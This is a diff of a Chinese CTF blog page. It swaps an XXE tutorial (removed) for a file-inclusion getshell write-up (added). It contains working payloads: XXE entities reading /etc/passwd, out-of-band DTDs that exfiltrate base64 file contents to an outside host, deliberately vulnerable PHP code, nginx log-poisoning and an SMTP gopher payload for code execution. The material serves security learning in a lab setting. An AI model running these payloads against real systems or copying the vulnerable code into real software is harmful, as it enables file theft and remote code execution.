@@ -6,12 +6,12 @@
   <meta name="author" content="Imtinmin" />
   
   
-  <title>XML注入学习 | Imtinmin的小站</title>
+  <title>需要getshell的文件包含 | Imtinmin的小站</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="CTF,WEB,CTF,XXE," />
+    <meta name="keywords" content="CTF,WEB,CTF,文件包含," />
   
 
   
@@ -164,7 +164,7 @@
   <div class="passage">
   <div class="passage-meta">
     <span>
-      <i class="fa fa-calendar"></i>2019-11-05
+      <i class="fa fa-calendar"></i>2019-11-07
     </span>
     
       <span>
@@ -178,51 +178,64 @@
     
   </div>
   <h1 class="passage-title">
-    XML注入学习
+    需要getshell的文件包含
   </h1>
   
     <div class="passage-cover">
-      <figure style="background-image:url(https://raw.githubusercontent.com/wiki/imtinmin/photo/xml/xml.png);"></figure>
+      <figure style="background-image:url(https://i.loli.net/2019/11/07/NC3UTQVZjKDxq2u.png);"></figure>
     </div>
   
   <article class="passage-article">
-    <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>xml.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+    <h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><h3 id="nginx-日志污染getshell"><a href="#nginx-日志污染getshell" class="headerlink" title="nginx 日志污染getshell"></a>nginx 日志污染getshell</h3><p>参考链接： </p>
+<blockquote>
+<p><a href="https://www.ifobnn.com/lfiwithnginxlog.html" target="_blank" rel="noopener">https://www.ifobnn.com/lfiwithnginxlog.html</a></p>
+<p><a href="http://yulige.top/?p=346" target="_blank" rel="noopener">http://yulige.top/?p=346</a> </p>
+</blockquote>
+<p>###　环境搭建</p>
+<p><code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--<span class="keyword">include</span>($_GET[<span class="string">'a'</span>]);--&gt;</span><br></pre></td></tr></table></figure>
 
-<p>常规payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/xml/xml1.png" alt="img"></p>
-<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
-<li>utf-7 (online tool: <a href="https://www.urlencoder.org/" target="_blank" rel="noopener">https://www.urlencoder.org/</a>)</li>
-</ul>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-7"?&gt;</span> </span><br><span class="line">+ADwAIQ-DOCTYPE data +AFs</span><br><span class="line">+ADwAIQ-ELEMENT data (+ACM-PCDATA)+AD4</span><br><span class="line">+ADwAIQ-ENTITY file SYSTEM +ACI-file:///etc/passwd+ACIAPg-</span><br><span class="line">+AF0APg</span><br><span class="line">+ADw-data+AD4AJg-file+ADsAPA-/data+AD4</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/xml/xml2.png" alt="img"></p>
-<h3 id="引用外部的DTD"><a href="#引用外部的DTD" class="headerlink" title="引用外部的DTD()"></a>引用外部的DTD()</h3><p>在自己的vps放dtd</p>
-<p><code>xml.dtd</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://vps/?%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>ubuntu16.04 需要把/var/log/nginx 目录权限设为645 </p>
+<p>error.log 设为至少644</p>
+</blockquote>
+<h3 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h3><p>用burp发包，浏览器会被编码</p>
+<p><img src="https://i.loli.net/2019/11/07/ZJkcIgFLnveSM68.png" alt=""></p>
+<p>成功写入</p>
+<p><img src="https://i.loli.net/2019/11/07/gD8jtVpoR3CqNAT.png" alt="nginx-include2.png"></p>
+<p>日志文件内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@9056889a4768:/var/log/nginx# cat error.log </span><br><span class="line">2019/11/07 07:32:07 [error] 9486#9486: *4 FastCGI sent in stderr: &quot;PHP message: PHP Notice:  Undefined index: a in /var/www/html/index.php on line 2</span><br><span class="line">PHP message: PHP Warning:  include(): Filename cannot be empty in /var/www/html/index.php on line 2</span><br><span class="line">PHP message: PHP Warning:  include(): Failed opening &apos;&apos; for inclusion (include_path=&apos;.:/usr/share/php&apos;) in /var/www/html/index.php on line 2&quot; while reading response header from upstream, client: 112.96.102.200, server: _, request: &quot;GET /?&lt;?php phpinfo();?&gt; HTTP/1.1&quot;, upstream: &quot;fastcgi://unix:/run/php/php7.0-fpm.sock:&quot;, host: &quot;39.108.36.103:7777&quot;</span><br></pre></td></tr></table></figure>
 
 
 
+<p>自己测试时，想清理日志可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@9056889a4768:/var/log/nginx# rm error.log </span><br><span class="line">root@9056889a4768:/var/log/nginx# touch error.log</span><br><span class="line">root@9056889a4768:/var/log/nginx# service nginx restart</span><br></pre></td></tr></table></figure>
+
+<p>不重启日志不会写进去</p>
+<hr>
+<h3 id="SMTP-日志投毒getshell-需要配合ssrf"><a href="#SMTP-日志投毒getshell-需要配合ssrf" class="headerlink" title="SMTP 日志投毒getshell(需要配合ssrf)"></a>SMTP 日志投毒getshell(需要配合ssrf)</h3><p> 出自2019年6月安恒杯的一题</p>
+<blockquote>
+<p>本地ubuntu18.04打不成，不知道为啥</p>
+</blockquote>
+<p>出题人镜像:   </p>
+<blockquote>
+<p> registry.cn-hangzhou.aliyuncs.com/bypass/postfix</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/bypass/postfix</span><br></pre></td></tr></table></figure>
+
+<p>用<code>Gopherus</code>构造payload</p>
+<p><img src="https://i.loli.net/2019/11/07/wpIVrzCTmHbOKhR.png" alt="image.png"></p>
 <p><code>payload</code></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % remote SYSTEM "http://ctf.tinmin.cn/xml.dtd"&gt;  </span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag"&gt;</span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>tinmin<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:25/_MAIL%20FROM:%3Ctinmin%40tinmin.cn%3E%0ARCPT%20To:%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%0ADATA%0AFrom:%3Ctinmin%40tinmin.cn%3E%0ASubject:test%0AMessage:test%0A.</span><br></pre></td></tr></table></figure>
 
-
-
-<p>可以不读php文件，<code>/etc/passwd</code>文件就不行，太大了</p>
-<p><img src="https://i.loli.net/2019/11/06/oM1QGtHnTElWudB.png" alt="img"></p>
-<p>也可以直接读php</p>
-<p><code>payload2</code></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE roottag [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://ctf.tinmin.cn/exp.dtd"&gt; </span></span><br><span class="line"><span class="meta">%dtd;%int;%send; ]&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>exp.dtd</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://ctf.tinmin.cn/?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>用burp测试发现，得在http头下隔一行，不然不成功，没懂什么原因,</p>
-<p><img src="https://i.loli.net/2019/11/06/XRoYfIkcUpOT1CW.png" alt="img"></p>
-<p>通过查看nginx 或者apache 日志</p>
-<p><img src="https://i.loli.net/2019/11/06/RkuCsn87Ly9hJKl.png" alt="image.png"></p>
+<p>发送&gt;&gt;&gt;&gt;&gt;</p>
+<p><img src="https://i.loli.net/2019/11/07/iOCfUB6IdQZWqMx.png" alt="curl"></p>
+<p>成功！</p>
+<p><img src="https://i.loli.net/2019/11/07/RZymX3OwBnTShEQ.png" alt="success"></p>
+<p>日志被污染成</p>
+<blockquote>
+<p>root@853c144383cb:/var/www/html# cat /var/log/mail.log<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: connect from localhost[127.0.0.1]<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: improper command pipelining after MAIL from localhost[127.0.0.1]: RCPT To:<?php phpinfo(); ?>\nDATA\nFrom:<a href="mailto:&#x74;&#x69;&#110;&#x6d;&#105;&#110;&#64;&#116;&#105;&#110;&#109;&#x69;&#110;&#46;&#99;&#x6e;" target="_blank" rel="noopener">&#x74;&#x69;&#110;&#x6d;&#105;&#110;&#64;&#116;&#105;&#110;&#109;&#x69;&#110;&#46;&#99;&#x6e;</a>\nSubject:test\nMessage:test\n.\r\n<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: warning: Illegal address syntax from localhost[127.0.0.1] in RCPT command: <?php phpinfo(); ?><br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: warning: non-SMTP command from localhost[127.0.0.1]: From:<a href="mailto:&#x74;&#x69;&#x6e;&#x6d;&#105;&#x6e;&#x40;&#116;&#x69;&#x6e;&#109;&#105;&#x6e;&#x2e;&#99;&#x6e;" target="_blank" rel="noopener">&#x74;&#x69;&#x6e;&#x6d;&#105;&#x6e;&#x40;&#116;&#x69;&#x6e;&#109;&#105;&#x6e;&#x2e;&#99;&#x6e;</a><br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: disconnect from localhost[127.0.0.1]</p>
+</blockquote>
 
   </article>
   <aside class="table-content" id="site-toc">
@@ -231,7 +244,7 @@
     <span>目录</span>
   </div>
   <div class="table-content-main">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编码"><span class="toc-text">编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#引用外部的DTD"><span class="toc-text">引用外部的DTD()</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Getshell"><span class="toc-text">Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx-日志污染getshell"><span class="toc-text">nginx 日志污染getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写入"><span class="toc-text">写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMTP-日志投毒getshell-需要配合ssrf"><span class="toc-text">SMTP 日志投毒getshell(需要配合ssrf)</span></a></li></ol></li></ol>
   </div>
 </aside>
   
@@ -242,7 +255,7 @@
      
       <a href="/tags/CTF/"><i class="fa fa-tags"></i>CTF</a>
      
-      <a href="/tags/XXE/"><i class="fa fa-tags"></i>XXE</a>
+      <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="fa fa-tags"></i>文件包含</a>
     
     </div>
   
@@ -366,10 +379,10 @@
 
 <div class="bottom-bar">
   <div class="bottom-bar-left">
-    <a href="/2019/11/07/2019-11-7-CTF-md/" data-enable="true">
+    <a href="javascript:void(0);" data-enable="false">
       <i class="fa fa-arrow-left"></i>
     </a>
-    <a href="/2019/11/04/2019-11-4-CTF/" data-enable="true">
+    <a href="/2019/11/05/2019-11-5-CTF/" data-enable="true">
       <i class="fa fa-arrow-right"></i>
     </a>
   </div>
